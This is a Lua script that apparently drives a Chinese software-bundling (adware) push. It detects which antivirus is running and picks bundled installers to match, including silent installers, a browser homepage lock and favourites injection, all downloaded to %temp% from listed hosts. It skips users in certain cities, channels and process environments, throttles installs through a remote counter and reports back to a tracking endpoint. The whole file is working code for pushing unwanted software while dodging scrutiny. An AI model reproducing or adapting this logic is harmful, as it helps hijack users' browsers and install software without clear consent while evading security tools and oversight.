require("unicorn")
require("extra")

project = "xxbz"
function report_kunbang(name, p1, p2, p3, p4, p5, p6, p7)
	extra.report_kunbang(project, name, p1, p2, p3, p4, p5, p6, p7)
end

function taskid_last_time(value)
	return extra.taskid_last_time(project, value)
end

function save_taskid(value)
	extra.save_taskid(project, value)
end

function qid()
	return extra.qid(project)
end

function version()
	return extra.version(project)
end

function md5()
	return extra.md5(project)
end

function city_name()
	return extra.city_name(project)
end

function nopop_set_time(value)
	return extra.nopop_set_time(project, value)
end

function printf(value)
	unicorn.printf(value .. "\n")
end

--安装间隔天数/近期不弹/最小间隔天数判断，返回结果结果为天数直接判断大小
function interval(timestamp, difftype)
	local today =
		os.time({year = os.date("%Y", os.time()), month = os.date("%m", os.time()), day = os.date("%d", os.time())})
	local otherday =
		os.time({year = os.date("%Y", timestamp), month = os.date("%m", timestamp), day = os.date("%d", timestamp)})
	local day = math.floor(os.difftime(today, otherday) / 86400)
	local hour = math.floor(os.difftime(os.time(), timestamp) / 3600)
	if difftype == nil then
		return math.abs(day)
	elseif string.lower(difftype) == "d" then
		return math.abs(day)
	elseif string.lower(difftype) == "h" then
		return math.abs(hour)
	else
		return math.abs(day)
	end
end

function report_onday(value, from)
	if interval(taskid_last_time(value)) < 1 then
		return
	else
		report_kunbang(value, true, true, true, true, 0, from, true)
		save_taskid(value)
		return
	end
end

function is_xp()
	if unicorn.system_info.v1 == 5 then
		return true
	else
		return false
	end
end

function table_maxn(t)
	local mn = 1
	for k, v in pairs(t) do
		if (type(k) ~= "number") then
			mn = 0
		end
	end
	return mn
end

function table2json(t)
	local function serialize(tbl)
		local tmp = {}
		for k, v in pairs(tbl) do
			local k_type = type(k)
			local v_type = type(v)
			local key = (k_type == "string" and '"' .. k .. '":') or (k_type == "number" and "")
			local value =
				(v_type == "table" and serialize(v)) or (v_type == "boolean" and tostring(v)) or
				(v_type == "string" and '"' .. v .. '"') or
				(v_type == "number" and v)
			tmp[#tmp + 1] = key and value and tostring(key) .. tostring(value) or nil
		end
		if table_maxn(tbl) == 0 then
			return "{" .. table.concat(tmp, ",") .. "}"
		else
			return "[" .. table.concat(tmp, ",") .. "]"
		end
	end
	assert(type(t) == "table")
	return serialize(t)
end

--匹配数组内元素,value=搜索词,array=被搜索数组,searchtype不填写或写0为前置匹配,其他为全词匹配
function stringinarray(value, array, searchtype)
	if searchtype == nil or searchtype == 0 then
		-- 前置匹配
		for k, v in ipairs(array) do
			local pos = string.find(string.upper(value), string.upper(v))
			if (pos == 1) then
				return true
			end
		end
		return false
	else
		--全词匹配
		for k, v in ipairs(array) do
			if (string.upper(v) == string.upper(value)) then
				return true
			end
		end
		return false
	end
end

--检查不弹环境,输入上报前缀及不弹列表
function check_enviroment(exclude_list)
	-- 检查渠道号
	if stringinarray(qid(),exclude_list.qid) then
		return false
	end
	-- 检查版本号
	if stringinarray(version(),exclude_list.version) then
		return false
	end
	-- 检查md5
	if stringinarray(md5(),exclude_list.md5,1) then
		return false
	end
	-- 检查城市
	if stringinarray(city_name(),exclude_list.citys,1) then
		return false
	end
	-- 检查进程名
	for k,v in ipairs(exclude_list.process)
	do 
		if stringinarray(v,unicorn.process,1)
		then
			return false
		end
	end
	return true
end

--控量检查,控量到则返回true,控量没到则返回false
function klcheck(name, count)
	local a = unicorn.web_http_get("http://xhapi.7654.com/showcountnew.php?param=show&name=" .. name)
	if tonumber(a) < count then
		unicorn.web_http_get("http://xhapi.7654.com/showcountnew.php?name=" .. name)
		return false
	else
		return true
	end
end

function is_exist(type, value)
	if type == "desktopfile" then
		if unicorn.file_exists(0, value) == true or unicorn.file_exists(19, value) == true then
			return true
		else
			return false
		end
	elseif type == "reg" then
		local start_i, end_j, substr = string.find(value, "(.-)/")
		local rootkey = (substr == "HKEY_LOCAL_MACHINE" and "HKLM") or (substr == "HKEY_CURRENT_USER" and "HKCU")
		local subkey = string.gsub(string.gsub(value, "(.-/)", "", 1), "/", "\\\\")
		return unicorn.reg_key_exist(rootkey, subkey)
	end
end

function soft_list_get(softs)
	local soft = {}
	local soft_list = {}
	local is_insert = true
	for k, v in pairs(softs) do
		is_insert = true
		soft = source_list(v)
		if soft ~= nil then
			if soft.detail.reg ~= nil and is_exist("reg", soft.detail.reg) == true then
				is_insert = false
			elseif soft.detail.desktopfile ~= nil and is_exist("desktopfile", soft.detail.desktopfile) == true then
				is_insert = false
			end
			if soft.maxshowcount ~= nil then
				if klcheck(soft.count_name, soft.maxshowcount) == true then
					is_insert = false
				end
			end
			if soft.detail.reg ~= nil and is_insert == true then
				soft.detail.reg = string.gsub(soft.detail.reg, "/", "\\\\")
			end
		else
			is_insert = false
		end
		if is_insert == true then
			table.insert(soft_list, soft.detail)
		end
		if #soft_list == 3 then
			return soft_list
		end
	end
	return soft_list
end

function source_list(display)
	if display == "收藏夹" or display == "锁首" or display == "收藏夹锁首" then
		if stringinarray(p_city, {"珠海", "北京", "深圳"}) == true then
			return nil
		end
	end
	if display == "锁首" or display == "收藏夹锁首" then
		local nohp_qid = {"baizhu_", "zk_", "zk1_"}
		if stringinarray(p_qid, nohp_qid) then
			return nil
		end
	end
	if display == "360浏览器" then
		if stringinarray(p_city, {"北京", "上海"}) == true then
			return nil
		end
	end
	local soft_source = {
		["收藏夹"] = {
            name = "SHHelper_search_fav7z",
            display = ((is360 == true) and "收藏夹") or ("天猫收藏夹"),
			url = "http://down1.wallpaper.shqingzao.com/tui/llqfavorites/SHHelper_search_fav.7z",
			installtype = 1
		},
		["锁首"] = {                                                                                                
            name = "SHHelper_search_lock7z",
            display = ((is360 == true) and "360导航") or ("7654导航"),
			url = "http://down1.wallpaper.shqingzao.com/tui/llqfavorites/SHHelper_search_lock.7z",
			installtype = 1
		},
		["收藏夹锁首"] = {                                                                                           
            name = "SHHelper_search7z",
            display = ((is360 ~= true and isqq ~= true and isjs ~= true) and "工具栏") or ("天猫收藏夹"),
			url = "http://down1.wallpaper.shqingzao.com/tui/llqfavorites/SHHelper_search.7z",
			installtype = 1
		},
		--ys001
		["快压"] = {                                                                                                   
			name = "KuaiZip-3",
			display = "快压",
			url = "http://dl.kkdownload.com/kz2ssky/KuaiZip_Setup_3147532414_ss_001.exe",
			reg = "HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Uninstall/Kuaizip",
			installtype = 0
		},
		["快压dll"] = {
            name = "KuaiZip_Setup_v2.9.2.5_ss_0037z",
            display = "快压",
            url = "http://ifinder.shzhanmeng.com/tui/finder/KuaiZip_Setup_v2.9.2.5_ss_003.7z",
			reg = "HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Uninstall/Kuaizip",
			installtype = 1
		},
		--jsb001
		["小黑记事本"] = {
			name = "HeiNote_1",
			display = "小黑记事本",
			url = "http://d.heinote.com/downloads/gs/HNInstall_Setup_601671923_gs_001.exe",
			reg = "HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Uninstall/HeiNote",
			installtype = 0
		},
		["小黑记事本dll"] = {
            name = "HNInstall_Setup_v2.0.4.6_gs_0027z",
            display = "小黑记事本",
            url = "http://ifinder.shzhanmeng.com/tui/finder/HNInstall_Setup_v2.0.4.6_gs_002.7z",
			reg = "HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Uninstall/HeiNote",
			installtype = 1
		},		
		--kt001
		["ABC看图"] = {
			name = "KanTu-1",
			display = "ABC看图",
			url = "http://down1.abckantu.com/gskt5/PhotoViewer_60430194_gskt_001.exe",
			reg = "HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Uninstall/PhotoViewer",
			installtype = 0
		},
		["ABC看图dll"] = {
			name = "PhotoViewer_v1.4.1.4_gskt_0037z",
			display = "ABC看图",
			url = "http://ifinder.shzhanmeng.com/tui/finder/PhotoViewer_v1.4.1.4_gskt_003.7z",
			reg = "HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Uninstall/PhotoViewer",
			installtype = 1
		},
		--bq001
		["小鱼便签"] = {            
			name = "XY-1",
			display = "小鱼便签",
			url = "http://downxy.shzhanmeng.com/xygsxy3/XY_Setup_1311462851_xygs_001.exe",
			reg = "HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Uninstall/xiaoyu",
			installtype = 0
		},
		["小鱼便签dll"] = {
            name = "XY_Setup_v1.2.0.2_xygs_0027z",
            display = "小鱼便签",
            url = "http://ifinder.shzhanmeng.com/tui/finder/XY_Setup_v1.2.0.2_xygs_002.7z",
			reg = "HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Uninstall/xiaoyu",
			installtype = 1
		},		
		--llq001
		["7654浏览器"] = {
            name = "7654browser",
            display = "7654浏览器",
            url = "http://down2.7654browser.shzhanmeng.com/ss/7654Browser_3147532414_ss_001.exe",
			reg = "HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Uninstall/7654browser",
			installtype = 0
		},
		--kt002
		["好图看看"] = {
            name = "haotukankan",
            display = "好图看看",
            url = "http://ifinder.shzhanmeng.com/tui/finder/haotukankan_setup_1.0.9.11_NS_Lite$silent@sousuo_001.exe",
			reg = "HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Uninstall/{01EB3F15-6569-4FCD-A1AA-913E906E2194}",
			installtype = 0
		},
		["好图看看PDF"] = {
            name = "haotukankanPDF",
            display = "好图看看",
            url = "http://ifinder.shzhanmeng.com/tui/finder/haotu_v2.0.0.5_guanwang_$silent@sousuopb_001.exe",
			reg = "HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Uninstall/{01EB3F15-6569-4FCD-A1AA-913E906E2194}",
			installtype = 0
		},
		["好图看看dll"] = {
            name = "haotukankan_v2.0.0.4@gs_0017z",
            display = "好图看看",
            url = "http://ifinder.shzhanmeng.com/tui/finder/haotukankan_v2.0.0.4@gs_001.7z",
			reg = "HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Uninstall/{01EB3F15-6569-4FCD-A1AA-913E906E2194}",
			installtype = 1
		},
		--ys002
		["极致压缩"] = {
			count_name = "JZipF",
			maxshowcount = 18000,
            name = "JZipF",
            display = "极致压缩",
            url = "http://d.jizunnet.com/gs/JZip_Setup_2298599146_gs_001.exe",
			reg = "HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Uninstall/JZip",
			installtype = 0
		},
		--pdf001
		["旋风PDF"] = {
            name = "WhirlwindPdf",
            display = "旋风PDF",
			url = "http://download.nanjingchenxi.com/gspdf/XFPdf_setup_2051627901_gspdf_001.exe",
            reg = "HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Uninstall/WhirlwindPdf"
		},
		--bz001
		["小象壁纸"] = {
            name = "CalfWallpaper",
            display = "小象壁纸",
			url = "http://down1.wallpaper.shqingzao.com/install/qid/ss2/CalfWallpaper_4236079249_ss_001.exe",
            reg = "HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Uninstall/CalfWallpaper"
		},
	}
	--[[
		count_name = "",
		maxshowcount = 100,
	]]
	local soft = {
		detail = {
			name = soft_source[display].name,
			display = soft_source[display].display,
			url = soft_source[display].url,
			save_path = "%temp%\\\\xxbz\\\\" .. string.gsub(soft_source[display].url, ".*/", ""),
			installtype = soft_source[display].installtype
		}
	}
	if soft_source[display].reg ~= nil then
		soft.detail.reg = soft_source[display].reg
	elseif soft_source[display].desktopfile ~= nil then
		soft.detail.desktopfile = soft_source[display].desktopfile
	end
	if soft_source[display].count_name ~= nil then
		soft.maxshowcount = soft_source[display].maxshowcount
		soft.count_name = soft_source[display].count_name
	end
	return soft
end

function kunbang_360()
	local softs = {"收藏夹", "锁首", "快压dll", "ABC看图dll", "小鱼便签dll", "光速搜索dll"}
	return {software = soft_list_get(softs)}
end

function kunbang_js()
	local softs = {"快压", "ABC看图", "小鱼便签", "光速搜索"}
	return {software = soft_list_get(softs)}
end

function kunbang_qq()
	local softs = {"快压", "ABC看图", "7654浏览器", "小鱼便签", "光速搜索"}
	return {software = soft_list_get(softs)}
end

function kunbang_qt()
	local softs = {"快压", "ABC看图", "小鱼便签", "光速搜索", "360浏览器"}
	return {software = soft_list_get(softs)}
end

function main()
	local aresult = {}
	if is360 == true then
		aresult = kunbang_360()
	elseif isjs == true then
		aresult = kunbang_js()
	elseif isqq == true then
		aresult = kunbang_qq()
	else
		aresult = kunbang_qt()
	end
	aresult.skin = "http://down1.wallpaper.shqingzao.com/tui/tui_decode.zip"
	result = table2json(aresult)
	printf(result)
	return
end

--全局变量定义
is360 = stringinarray("ZhuDongFangYu.exe", unicorn.process)
isqq = stringinarray("QQPCRTP.exe", unicorn.process)
isjs = stringinarray("kxescore.exe", unicorn.process)
p_version = version()
p_qid = qid()
p_city = city_name()
p_md5 = md5()

main()
